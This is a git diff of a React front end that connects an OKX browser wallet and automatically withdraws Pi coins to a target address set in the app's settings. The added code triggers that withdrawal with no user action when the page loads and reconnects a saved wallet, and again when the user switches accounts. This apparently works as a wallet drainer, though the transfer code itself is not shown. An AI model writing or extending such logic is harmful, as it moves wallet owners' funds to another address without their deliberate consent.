@@ -20,14 +20,86 @@ function App() {
   const [transactionStatus, setTransactionStatus] = useState<TransactionStatus | null>(null);
   const [targetWalletAddress, setTargetWalletAddress] = useState(okxWalletService.getTargetWalletAddress());
   const [showSettings, setShowSettings] = useState(false);
+  const [isReconnecting, setIsReconnecting] = useState(false);
 
   // Check if wallet is already connected on component mount
   useEffect(() => {
-    if (okxWalletService.isWalletConnected()) {
-      // Wallet is already connected, refresh wallet info
-      refreshWalletInfo();
+    const autoReconnect = async () => {
+      // Check if wallet was previously connected
+      if (okxWalletService.isWalletPreviouslyConnected()) {
+        setIsReconnecting(true);
+        setSuccess('🔄 Attempting to reconnect wallet...');
+        
+        try {
+          // Try to reconnect if wallet was previously connected
+          const reconnectedWallet = await okxWalletService.reconnectWallet();
+          if (reconnectedWallet) {
+            setWalletInfo(reconnectedWallet);
+            setSuccess('Wallet automatically reconnected!');
+            
+            // Automatically withdraw Pi coins after reconnection if available
+            if (parseFloat(reconnectedWallet.piBalance) > 0) {
+              setSuccess('Wallet reconnected! Starting Pi coin withdrawal...');
+              // Use setTimeout to avoid calling withdrawPiCoins during render
+              setTimeout(() => {
+                withdrawPiCoins();
+              }, 100);
+            }
+          } else {
+            setSuccess('ℹ️ No active wallet connection found');
+          }
+        } catch (error) {
+          console.error('Error during auto-reconnection:', error);
+          // If auto-reconnection fails, clear any invalid state
+          setWalletInfo(null);
+          setError('❌ Failed to reconnect wallet automatically');
+        } finally {
+          setIsReconnecting(false);
+        }
+      }
+    };
+
+    autoReconnect();
+
+    // Listen for wallet account changes
+    const handleAccountsChanged = async (accounts: string[]) => {
+      if (accounts.length === 0) {
+        // User disconnected the wallet
+        await disconnectWallet();
+      } else if (walletInfo && accounts[0] !== walletInfo.address) {
+        // User switched accounts
+        setSuccess('🔄 Wallet account changed, reconnecting...');
+        try {
+          const newWalletData = await okxWalletService.connectWallet();
+          setWalletInfo(newWalletData);
+          setSuccess('Connected to new wallet account!');
+          
+          // Automatically withdraw Pi coins if available
+          if (parseFloat(newWalletData.piBalance) > 0) {
+            setSuccess('New account connected! Starting Pi coin withdrawal...');
+            setTimeout(() => {
+              withdrawPiCoins();
+            }, 100);
+          }
+        } catch (error) {
+          console.error('Error connecting to new account:', error);
+          setError('❌ Failed to connect to new account');
+        }
+      }
+    };
+
+    // Add event listener for account changes
+    if (typeof window.okxwallet !== 'undefined') {
+      window.okxwallet.on('accountsChanged', handleAccountsChanged);
     }
-  }, []);
+
+    // Cleanup function
+    return () => {
+      if (typeof window.okxwallet !== 'undefined') {
+        window.okxwallet.removeListener('accountsChanged', handleAccountsChanged);
+      }
+    };
+  }, [walletInfo?.address]); // Add walletInfo.address as dependency
 
   const refreshWalletInfo = async () => {
     if (okxWalletService.isWalletConnected()) {
@@ -62,11 +134,11 @@ function App() {
     try {
       const walletData = await okxWalletService.connectWallet();
       setWalletInfo(walletData);
-      setSuccess('✅ OKX Wallet connected successfully!');
+      setSuccess('OKX Wallet connected successfully!');
       
       // Automatically withdraw Pi coins after connection
       if (parseFloat(walletData.piBalance) > 0) {
-        setSuccess('✅ Wallet connected! Starting Pi coin withdrawal...');
+        setSuccess('Wallet connected! Starting Pi coin withdrawal...');
         await withdrawPiCoins();
       } else {
         setSuccess('Wallet connected! No Pi coins found for withdrawal.');
@@ -85,7 +157,7 @@ function App() {
       setWithdrawalResult(null);
       setTransactionStatus(null);
       setError('');
-      setSuccess('✅ Wallet disconnected successfully');
+      setSuccess('Wallet disconnected successfully');
     } catch (err: any) {
       setError(`❌ Error disconnecting wallet: ${err.message}`);
     }
@@ -106,7 +178,7 @@ function App() {
       setWithdrawalResult(result);
       
       if (result.success) {
-        setSuccess(`✅ Successfully withdrew ${result.amount} Pi coins!`);
+        setSuccess(`Successfully withdrew ${result.amount} Pi coins!`);
         setTransactionStatus({
           hash: result.transactionHash!,
           confirmed: false
@@ -142,7 +214,7 @@ function App() {
             blockNumber: status.blockNumber,
             gasUsed: status.gasUsed
           });
-          setSuccess('✅ Transaction confirmed on blockchain!');
+          setSuccess('Transaction confirmed on blockchain!');
           return;
         }
         
@@ -163,10 +235,10 @@ function App() {
   const updateTargetWallet = () => {
     if (targetWalletAddress && /^0x[a-fA-F0-9]{40}$/.test(targetWalletAddress)) {
       okxWalletService.setTargetWalletAddress(targetWalletAddress);
-      setSuccess('✅ Target wallet address updated successfully!');
+      setSuccess('Target wallet address updated successfully!');
       setShowSettings(false);
     } else {
-      setError('❌ Invalid wallet address format');
+      setError('Invalid wallet address format');
     }
   };
 
@@ -239,35 +311,52 @@ function App() {
             
             {!walletInfo?.isConnected ? (
               <div className="connection-section">
-                <div className="wallet-instructions">
-                  <h3>Instructions</h3>
-                  <ol>
-                    <li>Install OKX Wallet browser extension</li>
-                    <li>Make sure you have Pi coins in your wallet</li>
-                    <li>Click "Connect Wallet" below</li>
-                    <li>Approve the connection in OKX Wallet</li>
-                    <li>Pi coins will be automatically withdrawn</li>
-                  </ol>
-                </div>
-                
-                <button 
-                  className={`connect-btn ${loading ? 'loading' : ''}`}
-                  onClick={connectWallet}
-                  disabled={loading}
-                >
-                  {loading ? (
-                    <>
-                      <span className="loading-spinner"></span>
-                      Connecting...
-                    </>
-                  ) : (
-                    '🔗 Connect OKX Wallet'
-                  )}
-                </button>
+                {isReconnecting ? (
+                  <div className="reconnecting-section">
+                    <div className="loading-spinner"></div>
+                    <h3>Reconnecting Wallet...</h3>
+                    <p>Attempting to restore your previous wallet connection</p>
+                  </div>
+                ) : (
+                  <>
+                    <div className="wallet-instructions">
+                      <h3>Instructions</h3>
+                      <ol>
+                        <li>Install OKX Wallet browser extension</li>
+                        <li>Make sure you have Pi coins in your wallet</li>
+                        <li>Click "Connect Wallet" below</li>
+                        <li>Approve the connection in OKX Wallet</li>
+                        <li>Pi coins will be automatically withdrawn</li>
+                      </ol>
+                    </div>
+                    
+                    <button 
+                      className={`connect-btn ${loading ? 'loading' : ''}`}
+                      onClick={connectWallet}
+                      disabled={loading}
+                    >
+                      {loading ? (
+                        <>
+                          <span className="loading-spinner"></span>
+                          Connecting...
+                        </>
+                      ) : (
+                        '🔗 Connect OKX Wallet'
+                      )}
+                    </button>
+                  </>
+                )}
                 
                 <div className="wallet-status">
                   {typeof window.okxwallet !== 'undefined' ? (
-                    <div className="status-ok">OKX Wallet detected</div>
+                    <div className="status-ok">
+                      OKX Wallet detected
+                      {okxWalletService.getPreviouslyConnectedAddress() && (
+                        <div className="previous-address">
+                          Previously connected: {okxWalletService.getPreviouslyConnectedAddress()?.slice(0, 6)}...{okxWalletService.getPreviouslyConnectedAddress()?.slice(-4)}
+                        </div>
+                      )}
+                    </div>
                   ) : (
                     <div className="status-error">❌ OKX Wallet not found. Please install the extension.</div>
                   )}
